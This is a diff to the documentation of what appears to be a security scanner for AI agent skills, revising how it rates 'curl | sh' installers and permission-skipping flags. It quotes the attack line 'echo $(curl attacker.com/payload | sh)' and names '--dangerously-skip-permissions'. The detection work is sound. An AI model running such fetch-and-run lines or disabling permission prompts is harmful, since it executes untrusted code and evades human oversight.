@@ -1237,7 +1237,7 @@ Known limits, each measured or stated, not guessed:
 
 - **A plain `curl … | sh` is LOW, not MEDIUM.** On 1,129 ordinary skills
   (corpus fetched 2026-10-25, re-measured 2026-10-27), 9 lines pipe or
-  download-and-run a third-party installer (LOW) and 12 more are vendor
+  download-and-run a third-party installer (LOW; 10 counting a security reference that quotes an attack) and 12 more are vendor
   installers, Dockerfile lines or advice against the shape (INFO). Raising
   the plain shape would put a MEDIUM on ordinary skills, so a plain pipe from
   an unlisted host stays LOW; only the concealed shapes (TLS off, decoded,
@@ -1303,11 +1303,16 @@ Known limits, each measured or stated, not guessed:
   does for nested `.mcp.json` files.
 - **Context is not judged.** A skill that switches permission prompts off
   inside a dev container it builds (trailofbits `devcontainer-setup`) gets the
-  same SKILL-006 HIGH as one that does it on the host, and a security
-  reference that quotes an attack command (trailofbits
-  `agentic-actions-auditor`: `echo $(curl attacker.com/payload | sh)`) gets
-  the same SKILL-005 HIGH as an instruction to run it. These are the two
-  benign MEDIUM+ skills in the 1,129-skill corpus.
+  same SKILL-006 HIGH as one that does it on the host. It is the one benign
+  MEDIUM+ skill in the 1,129-skill corpus.
+- **A fetch from a hostname without a scheme is LOW, not plaintext.** curl
+  defaults to http (and guesses FTP for hosts starting `ftp.`); newer wget
+  releases may default to https. Reading `curl attacker.com/x | sh` as
+  plaintext put a security reference that quotes it (trailofbits
+  `agentic-actions-auditor`) at HIGH, so only a raw public IP is read as
+  http; a hostname keeps the plain-pipe tier (LOW, or INFO when the sentence
+  advises against it). A real attack written this way is under-reported
+  by one tier.
 - **Harness flags are matched case-sensitively** (`claude`, `codex`, `gemini`,
   `qwen`), so prose naming "Gemini CLI" does not fire; an invocation written
   `Claude --dangerously-skip-permissions` is not matched.
